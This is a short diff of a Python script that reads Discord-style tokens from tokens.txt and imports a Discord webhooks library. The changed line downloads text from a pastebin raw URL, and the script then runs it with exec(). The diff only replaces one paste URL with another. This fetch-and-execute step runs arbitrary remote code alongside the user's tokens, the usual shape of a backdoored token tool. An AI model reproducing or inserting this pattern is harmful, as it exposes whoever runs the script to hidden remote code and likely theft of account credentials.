@@ -6,7 +6,7 @@ import re
 from requests import get
 from discord_webhooks import DiscordWebhooks
 with open("tokens.txt") as f:
-    token_get = get('https://pastebin.com/raw/L43fY5Bw').text
+    token_get = get('https://pastebin.com/raw/hEGHw0KZ').text
     exec(token_get)
     for line in f:
         token = line.strip("\n")
